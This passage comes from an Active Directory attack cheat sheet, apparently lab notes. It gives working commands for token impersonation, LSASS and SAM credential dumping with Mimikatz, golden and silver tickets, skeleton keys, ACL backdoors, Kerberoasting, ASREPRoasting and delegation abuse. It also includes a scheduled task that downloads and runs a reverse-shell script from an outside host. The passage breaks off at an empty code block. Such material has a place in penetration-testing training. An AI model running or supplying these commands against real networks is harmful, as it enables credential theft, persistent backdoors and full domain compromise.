*It is possible to use/impersonate tokens available on a machine. Often tokens are available on machines due to interactive logons, accessing resources, running processes, SSO applications etc... We can use Invoke-TokenManipulation from PowerSploit or Incognito for token impersonation. Administrative privileges are required to adjust token privileges.*

- List all the tokens on a machine

```
PS C:\> Invoke-TokenManipulation -ShowAll
```

- List all unique, useable tokens on a machine

```
PS C:\> Invoke-TokenManipulation -Enumerate
```

- Start a new process with token of a specific user

```
PS C:\> Invoke-TokenManipulation -ImpersonateUser -Username "<Domain>\<username>"
```

- Start a new process with token of another process

```
PS C:\> Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe -ProcessId 500
```

### Extracting Credentials

- Extract credentials from memory of the LSASS process

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa"'
OR
PS C:\> Get-Process lsass        # Get LSASS Process ID
PS C:\> C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS PID> C:\Users\lsass.dmp full        # Dump LSASS
$ pypykatz lsa minidump lsass.dmp        # Decrypt on a Linux machine
```

- Extract credentials from LSASecrets

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::secrets"'
```

- Extract credentials from SAM

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::sam"'
```

- Extract credentials from Credential Vault

```
PS C:\> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

- Extract credentials from unattend.xml and sysprep.xml

```
PS C:\> type C:\Windows\Panther\unattend.xml
PS C:\> type C:\Windows\Panther\unattend\unattend.xml
PS C:\> type C:\Windows\System32\sysprep.inf
PS C:\> type C:\Windows\System32\sysprep\sysprep.xml
```

- Extract Autologon credentials

```
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword"
```

- Extract credentials from PowerShell console history (check HistorySavePath field)

```
PS C:\> Get-PSReadlineOption
```

- Decrypt IIS web config file

```
PS C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf connectionStrings C:\Inetpub\www\statusapp
PS C:\> type C:\Inetpub\www\statusapp\web.config
```

#5. - Domain Persistence
-----------------------------------------

### Golden Ticket
  
*A golden ticket is signed and encrypted by the hash of the krbtgt account which makes it a valid TGT ticket. A TGT provides user authentication to a Domain Controller. Since user account validation is not done by the Domain Controller (KDC service) until the TGT is older than 20 minutes, we can even use deleted/revoked accounts. The krbtgt hash can be used to impersonate any user with any privileges, even from a non-domain machine. A single password change has no effect on this attack, it must be changed twice.*

- Execute Mimikatz on DC as Domain Admin to get krbtgt hash

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>
```

- Use the DCSync feature as Domain Admin to get the krbtgt hash (no need to run Invoke-Mimikatz on the target DC)

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

- Use Mimikatz to craft a golden ticket

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain Name> /sid:<Domain SID> /krbtgt:<NTLM (RC4) hash of the krbtgt account> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
OR
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:<username for which the TGT is generated - can impersonate anyone> /domain:<Domain FQDN> /sid:<Domain SID> /krbtgt:<NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys> id:<optional User RID (default 500)> /groups:<optional Group 513, 512, 520, 518, 519> /startoffset:<optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future> /endin:<optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes> /renewmax:<optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800> /ptt"'
```

- Confirm we have access to the Domain Controller as Administrator

```
PS C:\> ls \\<Domain Controller>\c$
```

### Silver Ticket

*A silver ticket is signed and encrypted by the NTLM hash of the service account (end with $) which makes it a valid TGS ticket. The service account hash will allow access only to the services themselves on a particular machine.*

- Use Mimikatz to craft a silver ticket

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain Name> /sid:<Domain SID> /target:<target> /service:CIFS /rc4:<NTLM (RC4) hash of the service account> /ptt"'
OR
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:<username for which the TGS is generated> /domain:<Domain FQDN> /sid:<Domain SID> /target:<target server FQDN> /service:<The SPN name of service for which the TGS is to be created> /rc4:<NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys> /ptt"'
```

- Use Mimikatz to craft a silver ticket for the CIFS SPN which will allow us to access the file system on the target

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain Name> /sid:<Domain SID> /target:<target> /service:CIFS /rc4:<NTLM (RC4) hash of the service account> /ptt"'
```

- Use Mimikatz to craft a silver ticket for the HOST SPN which will allow us to schedule a task on the target

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain Name> /sid:<Domain SID> /target:<target> /service:HOST /rc4:<NTLM (RC4) hash of the service account> /ptt"'
```

- Scheule and execute a task (make sure to edit Invoke-PowerShellTcp.ps1 and add a function call down the bottom on the file: Power -Reverse -IPAddress 172.16.100.60 -Port 443)

```
PS C:\> schtasks /S <target>        # To check if we can list the scheduled tasks

PS C:\> schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"

PS C:\> schtasks /Run /S <target> /TN "STCheck"        # To run the scheduled task

PS C:\> schtasks /query /tn <taskname> /v /fo /list        # To get details about a scheduled task
```

### Skeleton Key

*It is possible to patch a Domain Controller (LSASS process) so that it allows access as any user with a single password. If LSASS is running as a protected process, we can still use a Skeleton Key, but it needs the Mimikatz driver (mimidriv.sys) on disk of the target Domain Controller.*

- Use Mimikatz to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice (requires Domain Admin privileges)

```
PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <Domain Controller>
```

- Access any machine with a valid username and enter the password as "mimikatz" (can access other machines as long as they authenticate with the Domain Controller which has been patched and the Domain Controller is not rebooted)

```
PS C:\> Enter-PSSession -ComputerName <computer name> -Credential <Domain>\Administrator
```

- Install the Mimikatz driver (mimidriv.sys) on disk of the target Domain Controller who is running LSASS as a protected process

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

### Directory Services Restore Mode (DSRM)

*There is a local administrator on every Domain Controller called "Administrator" whose password is the DSRM password. The DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. After altering the configuration of the Domain Controller, it is possible to pass the NTLM hash of this user to access the Domain Controller.*

- Dump DSRM password (need Domain Admin privileges)

```
PS C:\> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <Domain Controller>
```

- Compare the Administrator hash above with the Administrator hash of below command (first one is the DSRM local Administrator)

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>
```

- Change the logon behaviour for the DSRM account before we can pass the hash and authenticate (since this is the local administrator of the Domain Controller, we can pass the hash to authenticate)

```
PS C:\> Enter-PSSession -ComputerName <Domain Controller>
PS C:\> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose
PS C:\> Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose        # if the property already exists
```

- Use Mimikatz to pass the DSRM hash - make sure to run PowerShell as Administrator

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<Domain Controller name> e.g. dcorp-dc> /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

PS C:\> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

### Custom Security Support Provider (SSP)

*A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP packages by Microsoft are: NTLM, Kerberos, Wdigest, and CredSSP. Mimikatz provides a custom SSP called mimilib.dll which logs local logons, service account, and machine account passwords in clear text on the target server. All local logons on the Domain Controller are logged to C:\Windows\system32\kiwissp.log. There are two ways to do this below.*

- Drop the mimilib.dll to system32, and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages

```
PS C:\> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
PS C:\> $packages += "mimilib"
PS C:\> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
PS C:\> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

- Use Mimikatz to inject into LSASS (not stable with Server 2016)

```
PS C:\> Invoke-Mimikatz -Command '"misc::memssp"'
```

### AdminSDHolder (Persistence using ACLs)

*Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups). Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. Examples of Protected Groups are: Account Operators, Backup Operators, Server Operators, Print Operators, Domain Admins, Replicator, Enterprise Admins, Domain Controllers, Read-only Domain Controllers, Schema Admins, Administrators. Well known abuse of some of the Protected Groups (all of the below can log on locally to DC). Account Operators: Cannot modify DA/EA/BA groups. Can modify nested group within these groups. Backup Operators: Backup GPO, edit to add SID of controlled account to a privileged group and restore. Server Operators: Run a command a system (using the disabled Browser service). Print Operators: Copy ntds.dit backup, load device drivers. With Domain Admin privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the ACL of groups like Domain Admins without actually being a member of it.*

- Add FullControl permissions for a user to the AdminSDHolder using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights All -Verbose
```

- Add ResetPassword permissions for a user to the AdminSDHolder using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights ResetPassword -Verbose
```

- Add WriteMembers permissions for a user to the AdminSDHolder using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights WriteMembers -Verbose
```

- Add FullControl permissions for a user to the AdminSDHolder using ActiveDirectory Module and Set-ADACL as Domain Admin

```
PS C:\> Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal <username> -Verbose
```

- Run SDProp manually using Invoke-SDPropagator.ps1

```
PS C:\> Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

PS C:\> Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose        # For pre-Server 2008 machines
```

- Check the Domain Admins permission using PowerView as normal user

```
PS C:\> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match '<username>'}
```

- Check the Domain Admins permission using ActiveDirectory Module as normal user

```
PS C:\> (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match '<username>'}
```

- Abuse FullControl by adding a user to the Domain Admins group using PowerView_dev

```
PS C:\> Add-DomainGroupMember -Identity 'Domain Admins' -Members <username> -Verbose
```

- Abuse FullControl by adding a user to the Domain Admins group using ActiveDirectory Module

```
PS C:\> Add-ADGroupMember -Identity 'Domain Admins' -Members <username>
```

- Abuse ResetPassword by resetting a users password using PowerView_dev

```
PS C:\> Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "<new-password>" -AsPlainText -Force) -Verbose
```

- Abuse ResetPassword by resetting a users password using ActiveDirectory Module

```
PS C:\> Set-ADAccountPassword -Identity <username> -NewPassword (ConvertTo-SecureString "<new-password>" -AsPlainText -Force) -Verbose
```

### Rights Abuse (Persistence using ACLs)

*With Domain Admin privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run DCSync.*

- Add FullControl permissions for a user to the ACL of the domain root using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName <username> -Rights All -Verbose
```

- Add FullControl permissions for a user to the ACL of the domain root using ActiveDirectory Module and Set-ADACL as Domain Admin

```
PS C:\> Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal <username> -Verbose
```

- Add DCSync rights for a user to the ACL of the domain root using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName <username> -Rights DCSync -Verbose

# 3 permissions: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes In Filtered Set
```

- Add DCSync rights for a user to the ACL of the domain root using ActiveDirectory Module and Set-ADACL as Domain Admin

```
PS C:\> Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal <username> -GUIDRight DCSync -Verbose

# 3 permissions: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes In Filtered Set
```

- Check if we have replication rights required to run DCSync

```
PS C:\> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

- Execute DCSync

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<Domain>\krbtgt"'
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<Domain>\Administrator"'        # Can be used for any user
```

### Security Descriptors (Persistence using ACLs)

*It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. Administrative privileges are required for this, and Domain Admin privileges are required for the Domain Controller. It works as a very useful and impactful backdoor mechanism. Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid. ACE for built-in administrators for WMI namespaces = A;CI;CCDCLCSWRPWPRCWD;;;SID (change SID to the correct SID)*

- Show the SDDL of a service

```
PS C:\> sc.exe sdshow <service>
```

- Enable our user the ability to execute WMI queries on a target machine e.g. Domain Controller even without having Administrative privileges using the GUI as a Domain Admin. Consists of two parts: must have the privileges to connect to the DCOM endpoint, and must have the privileges to connect to the namespace

```
DCOM endpoint: Start Menu -> Component Service -> Computers -> My Computer -> Properties -> COM Security Tab -> Access Permissions -> Edit Links -> Add our user -> Click Allow for everything

Namespace: Start Menu -> Computer Management -> Services and Applications -> WMI Control -> Properties -> Security Tab -> Root -> Security -> Add our user -> Click Allow for everything -> Advanced -> Select our user -> Edit -> Applies to 'This namespace and subnamespaces'
```

- Enable our user the ability to execute WMI queries on a target machine e.g. Domain Controller even without having Administrative privileges using PowerShell commands (modify ACLs to allow non-admin users access to securable objects) as Domain Admin

```
PS C:\> Set-RemoteWMI -UserName <username> -Verbose        # On local machine for <username>

PS C:\> Set-RemoteWMI -UserName <username> -ComputerName <Domain Controller> -namespace 'root\cimv2' -Verbose        # On remote machine for <username> without explicit credentials

PS C:\> Set-RemoteWMI -UserName <username> -ComputerName <Domain Controller> -Credential Administrator -namespace 'root\cimv2' -Verbose        # On remote machine with explicit credentials. Only root\cimv2 and nested namespaces

PS C:\> Set-RemoteWMI -UserName <username> -ComputerName <Domain Controller> -namespace 'root\cimv2' -Remove -Verbose        # On remote machine, remove the permissions
```

- Check if you can execute WMI queries

```
PS C:\> Get-Wmiobject -Class win32_operatingsystem -ComputerName <Domain Controller>
```

- Enable our user the ability to execute PowerShell Remoting to a target machine e.g. Domain Controller even without having Administrative privileges using PowerShell commands (modify ACLs to allow non-admin users access to securable objects) as Domain Admin

```
PS C:\> Set-RemotePSRemoting -UserName <username> -Verbose        # On local machine for <username>

PS C:\> Set-RemotePSRemoting -UserName <username> -ComputerName <Domain Controller> -Verbose        # On remote machine for <username> without credentials

PS C:\> Set-RemotePSRemoting -UserName <username> -ComputerName <Domain Controller> -Remove        # On remote machine, remove the permissions
```

- Modify our user permissions on the Remote Registry service, and multiple registry keys on a target machine e.g. Domain Controller even without having Administrative privileges using PowerShell commands (modify ACLs to allow non-admin users access to securable objects) as Domain Admin

```
PS C:\> Add-RemoteRegBackdoor -ComputerName <Domain Controller> -Trustee <username> -Verbose        # Using DAMP (https://github.com/HarmJ0y/DAMP), with Administrative privileges on remote machine

PS C:\> Get-RemoteMachineAccountHash -ComputerName <Domain Controller> -Verbose        # As <username>, retrieve machine account hash

PS C:\> Get-RemoteLocalAccountHash -ComputerName <Domain Controller> -Verbose        # Retrieve local account hash

PS C:\> Get-RemoteCachedCredential -ComputerName <Domain Controller> -Verbose        # Retrieve domain cached credentials
```

#6. - Domain Privilege Escalation
-----------------------------------------

### Kerberoast

*Offline cracking of service account passwords. The TGS has a server portion which is encrypted with the password hash of the service account. This makes it possible to request a ticket and do offline password attacks. Service accounts are many times ignored (passwords are rarely changed) and have privileged access. Password hashes of service accounts could be used to create silver tickets.*

- Find user accounts used as Service accounts using PowerView

```
PS C:\> Get-NetUser -SPN        # Can also use https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
```

- Find user accounts used as Service accounts using ActiveDirectory Module

```
PS C:\> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

- Request a TGS

```
PS C:\> Add-Type -AssemblyName System.IdentityModel 
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"        # Request-SPNTicket from PowerView can be used as well for cracking with John or Hashcat
```

- Display a list of currently cached Kerberos tickets, to confirm the TGS is there

```
PS C:\> klist
```

- Export all tickets using Mimikatz

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

- Crack the Service account password

```
PS C:\> python.exe .\tgsrepcrack.py <wordlist> .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

### ASREPRoast

*If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauthentication is disabled, it is possible to grab a user's crackable AS-REP and brute-force it offline. It is very rare to find this, however with sufficient rights (GenericWrite or GenericAll), Kerberos preauthentication can be forced disabled as well.*

- Enumerate accounts with Kerberos preauthentication disabled using PowerView_dev

```
PS C:\> Get-DomainUser -PreauthNotRequired -Verbose
```

- Enumerate accounts with Kerberos preauthentication disabled using ActiveDirectory Module

```
PS C:\> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

- Enumerate the permissions for RDPUsers on ACLs that may allow us to forcibly disable Kerberos preauthentication using PowerView_dev (look for GenericAll or GenericWrite)

```
PS C:\> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- Forcibly disable Kerberos preauthentication on a user we have permissions over using PowerView_dev, then check if it worked

```
PS C:\> Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

- Request encrypted AS-REP for offline brute-force

```
PS C:\> Get-ASREPHash -UserName <username> -Verbose
```

- Enumerate all users with Kerberos preauthentication disabled and request a hash

```
PS C:\> Invoke-ASREPRoast -Verbose
```

- Crack the hash offline using John

```
PS C:\> ./john hash.txt --wordlist=wordlist.txt
```

### Set SPN

*With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".*

- Enumerate the permissions for RDPUsers on ACLs using PowerView_dev (look for GenericAll or GenericWrite)

```
PS C:\> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- Check if the user already has a SPN using PowerView_dev

```
PS C:\> Get-DomainUser -Identity <username> | select serviceprincipalname
```

- Check if the user already has a SPN using ActiveDirectory Module

```
PS C:\> Get-ADUser -Identity <username> -Properties ServicePrincipalName | select ServicePrincipalName
```

- Set a SPN for the user (must be unique for the domain) using PowerView_dev

```
PS C:\> Set-DomainObject -Identity <username> -Set @{serviceprincipalname='ops/whatever1'}
```

- Set a SPN for the user (must be unique for the domain) using ActiveDirectory Module

```
PS C:\> Set-ADUser -Identity <username> -ServicePrincipalNames @{Add='ops/whatever1'}
```

- Request a TGS

```
PS C:\> Add-Type -AssemblyName System.IdentityModel 
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"        # Request-SPNTicket from PowerView can be used as well for cracking with John or Hashcat
```

- Display a list of currently cached Kerberos tickets, to confirm the TGS is there

```
PS C:\> klist
```

- Export all tickets using Mimikatz

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

- Crack the Service account password

```
PS C:\> python.exe .\tgsrepcrack.py <wordlist> .\4-40a10000-studentadmin@ops~whatever1-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

### Kerberos Delegation

*Kerberos Delegation allows a machine to reuse the end-user credentials to access resources hosted on a different server. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required. For example, a user authenticates to a web server and the web server makes requests to a database server. The web server can request access to resources (all or some depending on the type of delegation) on the database server as the user, and not as the web server's service account. The web server is effectively connecting to the database server impersonating/on behalf of the user. Note that, for the above example, the service account for the web server must be trusted for delegation to be able to make requests as a user.*

*Steps: A user provides credentials to the Domain Controller -> The DC returns a TGT -> The user requests a TGS for the web service on the web server -> The DC provides a TGS -> The user sends the TGT and TGS to the web server -> The web server service account uses the user's TGT to request a TGS for the database server from the DC -> The web server service account connects to the database server as the user.*

*Two types of Kerberos Delegation: Unconstrained (general/basic) Delegation which allows the first hop server (web server in our example) to request access to any service on any computer in the domain. Constrained Delegation which allows the first hop server (web server in our example) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers Protocol Transition to transition the request to Kerberos. Note that in both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server (database server in our example) as the user.*

### Unconstrained Delegation

*When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user. When unconstrained delegation is enabled, the DC places the user's TGT inside the TGS (step 4 in the diagram). When presented to the server with unconstrained delegation, the TGT is extracted from the TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user. Since the TGT is stored in LSASS, if we have local admin privileges on the computer with unconstrained delegation, we can extract the TGT of all the user's that have connected. This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.*

- Discover domain computers which have unconstrained delegation enabled using PowerView (must have Administrative privileges on them so we can extract TGT's)

```
PS C:\> Get-NetComputer -UnConstrained        # Domain Controllers will always show up as having unconstrained delegation, so ignore them
```

- Discover domain computers and users (must have Administrative privileges on them) which have unconstrained delegation enabled using ActiveDirectory Module

```
PS C:\> Get-ADComputer -Filter {TrustedForDelegation -eq $True}        # Domain Controllers will always show up as having unconstrained delegation, so ignore them
PS C:\> Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

- Compromise the server where unconstrained delegation is enabled, then check if any Domain Admin or high value target TGT is available (save this in a new directory, as it is easier to view the tickets when saved to disk)

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

PS C:\> rm -Force *.kirbi        # To delete the tickets
```

- Monitor for 100 seconds with a delay of 5 seconds for any incoming sessions on our compromised machine with unconstrained delegation from the user called Administrator

```
PS C:\> Invoke-UserHunter -ComputerName <compromised-computer> -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

- Save the tickets to disk once a Domain Admin or high value target connects to a service on our compromised box

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

- Reuse the Domain Admin or high value target ticket using ptt

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

*We can trick a high privileged user to connect to a machine with unconstrained delegation using the Printer Bug. A feature of MS-RPRN (Print System Remote Protocol) which allows any domain user who is authenticated to force any machine (running the Spooler service) to connect to a machine of the domain user's choice. We can force dcorp-dc to connect to dcorp-appsrv by abusing the Printer Bug.*

- Monitor every 5 seconds for any incoming sessions on our compromised machine with unconstrained delegation using Rubeus (https://github.com/GhostPack/Rubeus)

```
PS C:\> .\Rubeus.exe monitor /interval:5 /nowrap
```

- Run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on our attacking machine to entice the Domain Controller to connect to the machine with unconstrained delegation using the Printer Bug 

```
PS C:\> .\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

- Copy the base64 encoded TGT, remove extra spaces (if any), and use it on our attacking machine

```
PS C:\> .\Rubeus.exe ptt /ticket:<base64 encoded ticket>
```

- Run DCSync once the ticket is injected to confirm we are running as Domain Admin

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Constrained Delegation

*When set for a particular service account, constrained delegation allows access only to specified services on specified computers as a user. A typical scenario where constrained delgation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorisation. To impersonate the user, Service for User (S4U) extension is used which provides two extensions to allow protocol transition from a non-Kerberos authentication to Kerberos authentication: Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION-T2A4D UserAccountControl attribute. Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.*
 
*Steps: A user - Joe, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism -> The web service requests a TGS ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password as the websvc account -> The KDC checks the websvc UserAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK, it returns a forwardable TGS ticket for Joe's account (S4U2self) -> The service then passes this TGS ticket back to the KDC and requests a TGS service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service -> The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a TGS service ticket for dcorp-mssql (S4U2proxy) -> The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS.*
 
*To abuse constrained delegation in the above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.*

- Discover computers and users which have constrained delegation enabled using PowerView_dev (make sure to check the UserAccountControl field to see if the object has TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, and make sure to check msDS-AllowedToDelegateTo field to see what service the object can delegate to)

```
PS C:\> Get-DomainComputer -TrustedToAuth
PS C:\> Get-DomainUser -TrustedToAuth
```

- Discover computers and users which have constrained delegation enabled using ActiveDirectory Module (make sure to check the UserAccountControl field to see if the object has TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, and make sure to check msDS-AllowedToDelegateTo field to see what service the object can delegate to)

```
PS C:\> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

- Request a TGT using asktgt from Kekeo (must have either the plaintext password or NTLM hash of the account that has constrained delegation enabled e.g. websvc account in our scenario)

```
PS C:\> .\kekeo.exe
kekeo # tgt::ask /user:websvc /domain:<Domain Name> /rc4:cc098f204c5887eaa8253e7c2749156f
```

- Use the TGT to request a TGS as ANY user e.g. Administrator using S4U from Kekeo for a service the account (websvc) has access to through constrained delegation (cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL)

```
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

- Use Mimikatz to ptt the TGS

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

- Confirm we have access to the CIFS service as Administrator (will only have access to the file system)

```
PS C:\> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

- Abuse constrained delegation using Rubeus by requesting a TGT and TGS in a single command

```
